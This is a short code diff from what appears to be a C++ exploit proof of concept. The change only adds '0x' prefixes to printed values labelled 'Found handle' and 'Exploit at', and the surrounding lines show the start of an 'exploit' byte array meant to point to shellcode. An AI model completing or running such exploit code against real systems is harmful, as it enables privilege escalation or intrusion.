@@ -39,8 +39,8 @@ int main()
 
 		std::cout << std::endl;
 
-		std::cout << "Found handle: " << std::hex << handle << std::endl;
-		std::cout << "Exploit at: " << std::hex << (uintptr_t)pwn << std::endl;
+		std::cout << "Found handle: 0x" << std::hex << handle << std::endl;
+		std::cout << "Exploit at: 0x" << std::hex << (uintptr_t)pwn << std::endl;
 
 		unsigned char exploit[] = {
 			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,				// pointer to shellcode start
